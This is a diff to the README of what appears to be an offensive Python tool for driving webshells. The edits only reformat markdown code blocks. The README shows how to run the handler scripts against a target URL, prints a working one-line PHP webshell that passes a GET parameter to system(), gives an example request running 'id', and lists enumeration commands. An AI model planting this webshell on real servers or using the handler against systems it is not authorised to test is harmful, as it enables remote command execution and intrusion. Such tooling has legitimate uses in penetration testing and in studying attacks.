@@ -27,48 +27,44 @@ Extended version with additional functionality:
 ## Requirements
 Python **3.10+**
 Dependency:
-```
+
+Uses the Python HTTP library Requests.
+```bash
 requests>=2.31.0
-```
-Requirements installation:
-```
+
+#Requirements installation:
 pip install -r requirements.txt
 ```
-Uses the Python HTTP library Requests.
-
 
 ## Usage
 
 ### Minimal client
-```
+```bash
 python3 webshell_handler_mini.py <webshell_url> <command_parameter>
-```
-Example:
-```
+
+# Example:
 python3 webshell_handler_mini.py http://target/webshell.php cmd
 ```
 
 ### Full handler
-```
+```bash
 python3 webshell_handler.py <webshell_url> <command_parameter>
-```
-Example:
-```
+
+# Example:
 python3 webshell_handler.py http://target/webshell.php cmd
 ```
 
 ## Example Webshell
-Example PHP webshell used by the handler:
+Example PHP webshell.php used by the handler:
 ```php
 <?php system($_GET['cmd']); ?>
-```
-Example GET request:
-```
+
+# Example GET request:
 http://target/webshell.php?cmd=id
 ```
 
 ## Example Commands (Full Handler)
-```
+```bash
 help
 detect
 enum
